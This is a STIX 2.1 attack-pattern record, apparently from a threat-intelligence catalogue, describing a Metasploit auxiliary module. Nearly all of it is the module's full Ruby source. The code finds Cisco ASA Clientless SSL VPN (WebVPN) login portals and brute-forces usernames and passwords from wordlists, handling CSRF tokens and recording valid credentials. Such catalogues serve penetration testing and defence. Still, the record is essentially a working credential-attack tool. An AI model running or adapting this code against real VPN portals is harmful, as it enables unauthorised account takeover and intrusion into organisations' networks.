{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa046adb-6eb7-4bc3-9acb-e63135c3e215",
    "created": "2024-08-14T16:29:18.081877Z",
    "modified": "2024-08-14T16:29:18.081881Z",
    "name": "Cisco ASA Clientless SSL VPN (WebVPN) Brute-force Login Utility",
    "description": " This module scans for Cisco ASA Clientless SSL VPN (WebVPN) web login portals and performs login brute-force to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_asa_clientless_vpn.rb",
            "external_id": "cisco_asa_clientless_vpn.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisco.com/c/en/us/support/docs/security-vpn/webvpn-ssl-vpn/119417-config-asa-00.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Deprecated\n  moved_from 'auxiliary/scanner/http/cisco_asa_asdm'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco ASA Clientless SSL VPN (WebVPN) Brute-force Login Utility',\n        'Description' => %q{\n          This module scans for Cisco ASA Clientless SSL VPN (WebVPN) web login portals and\n          performs login brute-force to identify valid credentials.\n        },\n        'Author' => [\n          'Jonathan Claudius <jclaudius[at]trustwave.com>', # original Metasploit module\n          'jbaines-r7' # updated module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.cisco.com/c/en/us/support/docs/security-vpn/webvpn-ssl-vpn/119417-config-asa-00.html' ]\n        ],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('GROUP', [true, 'The connection profile to log in to (blank by default)', '']),\n        OptPath.new('USERPASS_FILE', [\n          false, 'File containing users and passwords separated by space, one pair per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')\n        ]),\n        OptPath.new('USER_FILE', [\n          false, 'File containing users, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_users.txt')\n        ]),\n        OptPath.new('PASS_FILE', [\n          false, 'File containing passwords, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')\n        ])\n      ]\n    )\n  end\n\n  def run_host(_ip)\n    # Establish the remote host is running the clientless vpn\n    res = send_request_cgi('uri' => normalize_uri('/+CSCOE+/logon.html'))\n    if res && res.code == 200 && res.get_cookies.include?('webvpn')\n      print_status('The remote target appears to host Cisco SSL VPN Service. The module will continue.')\n      print_status('Starting login brute force...')\n\n      each_user_pass do |user, pass|\n        do_login(user, pass)\n      end\n    else\n      print_status('Cisco SSL VPN Service not detected on the remote target')\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'Cisco ASA SSL VPN Service',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Brute-force the login page\n  def do_login(user, pass)\n    vprint_status(\"Trying username:#{user.inspect} with password:#{pass.inspect}\")\n\n    # some versions require we snag a CSRF token. So visit the logon portal\n    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('/+CSCOE+/logon.html'))\n    return unless res && res.code == 200\n\n    vars_hash = {\n      'tgroup' => '',\n      'next' => '',\n      'tgcookieset' => '',\n      'username' => user,\n      'password' => pass,\n      'Login' => 'Login'\n    }\n\n    cookie = 'webvpnlogin=1'\n\n    # the web portal may or may not contain CSRF tokens. So snag the token if it exists.\n    if res.body.include?('csrf_token')\n      csrf_token = res.body[/<input name=\"csrf_token\" type=hidden value=\"(?<token>[0-9a-f]+)\">/, :token]\n      if csrf_token\n        vars_hash['csrf_token'] = csrf_token\n        cookie = \"#{cookie}; CSRFtoken=#{csrf_token};\"\n      else\n        print_error('Failed to grab the CSRF token')\n        return\n      end\n    end\n\n    # only add the group if the user specifies a non-empty value\n    unless datastore['GROUP'].nil? || datastore['GROUP'].empty?\n      vars_hash['group_list'] = datastore['GROUP']\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri('/+webvpn+/index.html'),\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'cookie' => cookie,\n      'vars_post' => vars_hash\n    })\n\n    # check if the user was likely forwarded to the clientless vpn page\n    if res && res.code == 200 && res.body.include?('/+webvpn+/webvpn_logout.html') && res.body.include?('/+CSCOE+/session.js')\n\n      print_good(\"SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)\n\n      # logout - the default vpn connection limit is 2 so it's best to free this one up. Unfortunately,\n      # we need a CSRF and non-CSRF version for this as well.\n      if res.body.include?('csrf_token')\n        csrf_token = res.body[/<input type=\"hidden\" name=\"csrf_token\" value=\"(?<token>[0-9a-f]+)\">/, :token]\n\n        # if we don't pull out the token... just keep going? Failing logout isn't the end of the world.\n        if csrf_token\n          send_request_cgi(\n            'uri' => normalize_uri('/+webvpn+/webvpn_logout.html'),\n            'method' => 'POST',\n            'vars_post' => { 'csrf_token' => csrf_token },\n            'cookie' => res.get_cookies\n          )\n        end\n      else\n        send_request_cgi('uri' => normalize_uri('/+webvpn+/webvpn_logout.html'), 'cookie' => res.get_cookies)\n      end\n\n      return :next_user\n    else\n      vprint_error(\"FAILED LOGIN - #{user.inspect}:#{pass.inspect}\")\n    end\n  end\nend\n"
}